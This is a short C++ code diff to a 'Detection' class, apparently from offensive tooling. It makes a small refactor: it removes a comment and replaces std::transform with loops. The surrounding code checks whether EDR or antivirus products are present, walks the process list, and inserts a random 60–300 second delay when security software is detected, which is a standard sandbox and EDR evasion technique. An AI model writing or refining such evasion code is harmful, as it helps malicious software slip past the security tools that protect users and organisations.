@@ -37,7 +37,7 @@ int Detection::GetJitterDelay() {
     if (IsEDRPresent() || IsAVPresent()) {
         std::random_device rd;
         std::mt19937 gen(rd());
-        std::uniform_int_distribution<> dis(60, 300); // 60-300s jitter as requested
+        std::uniform_int_distribution<> dis(60, 300);
         return dis(gen);
     }
     return 0;
@@ -52,9 +52,9 @@ bool Detection::IsProcessRunning(const std::wstring& processName) {
         if (Process32FirstW(hSnapshot, &pe)) {
             do {
                 std::wstring currentProcess = pe.szExeFile;
-                std::transform(currentProcess.begin(), currentProcess.end(), currentProcess.begin(), [](wchar_t c) { return (wchar_t)std::towlower(c); });
+                for (auto& c : currentProcess) c = (wchar_t)::towlower(c);
                 std::wstring targetProcess = processName;
-                std::transform(targetProcess.begin(), targetProcess.end(), targetProcess.begin(), [](wchar_t c) { return (wchar_t)std::towlower(c); });
+                for (auto& c : targetProcess) c = (wchar_t)::towlower(c);
 
                 if (currentProcess == targetProcess) {
                     found = true;
